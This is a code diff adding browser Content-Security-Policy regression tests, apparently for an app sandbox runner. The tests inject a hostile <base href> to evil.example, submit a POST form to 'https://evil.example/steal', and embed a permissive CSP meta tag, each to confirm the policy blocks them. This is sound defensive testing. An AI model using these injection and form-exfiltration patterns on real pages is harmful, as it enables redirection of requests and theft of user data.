@@ -27,11 +27,11 @@ export interface BrowserCspCheck {
 }
 
 /** Wraps a check script (which must call `report(pass, detail)`) into a full app page. */
-function checkPage(id: string, script: string, body = ''): string {
+function checkPage(id: string, script: string, body = '', head = ''): string {
   const scriptOpen = '<script>';
   const scriptClose = '</' + 'script>';
   return injectCsp(
-    `<!DOCTYPE html><html><head><title>${id}</title></head><body>${body}${scriptOpen}
+    `<!DOCTYPE html><html><head><title>${id}</title>${head}</head><body>${body}${scriptOpen}
 (function () {
   var done = false;
   function report(pass, detail) {
@@ -190,6 +190,61 @@ export const BROWSER_CSP_CHECKS: readonly BrowserCspCheck[] = [
     el.onerror = function () { report(false, 'allowlisted CDN script blocked'); };
     document.body.appendChild(el);
 `,
+    ),
+  },
+  {
+    id: 'hostile-base-uri-ignored',
+    description: "a hostile <base href> is inert (base-uri 'none') and relative fetches still fail",
+    timeoutMs: 5000,
+    html: checkPage(
+      'hostile-base-uri-ignored',
+      `
+    var baseOk = document.baseURI.indexOf('https://evil.example') === -1;
+    if (!baseOk) { report(false, 'baseURI followed hostile <base>: ' + document.baseURI); }
+    fetch('probe.json').then(
+      function () { report(false, 'relative fetch resolved'); },
+      function () { report(baseOk, ''); }
+    );
+`,
+      '',
+      '<base href="https://evil.example/">',
+    ),
+  },
+  {
+    id: 'form-action-blocked',
+    description: "programmatic form.submit() to an external action never navigates (form-action 'none')",
+    timeoutMs: 5000,
+    html: checkPage(
+      'form-action-blocked',
+      `
+    // If the submission were allowed, the document would navigate away and NO verdict
+    // would ever arrive — the harness must treat a missing verdict as a failure.
+    document.addEventListener('securitypolicyviolation', function (e) {
+      if (e.violatedDirective && e.violatedDirective.indexOf('form-action') === 0) report(true, '');
+    });
+    var form = document.createElement('form');
+    form.action = 'https://evil.example/steal';
+    form.method = 'POST';
+    document.body.appendChild(form);
+    form.submit();
+    setTimeout(function () { report(true, 'still alive after submit'); }, 800);
+`,
+    ),
+  },
+  {
+    id: 'permissive-app-meta-loses',
+    description: 'an app shipping its own permissive CSP meta cannot widen the policy — intersection wins',
+    timeoutMs: 5000,
+    html: checkPage(
+      'permissive-app-meta-loses',
+      `
+    fetch('https://example.com/').then(
+      function () { report(false, 'fetch resolved despite the runner policy'); },
+      function () { report(true, ''); }
+    );
+`,
+      '',
+      '<meta http-equiv="Content-Security-Policy" content="default-src * \'unsafe-inline\' \'unsafe-eval\' data: blob:">',
     ),
   },
   hostilePage('hostile-script-before-head', (probe) => `${probe}<head><title>x</title></head><body>x</body>`),
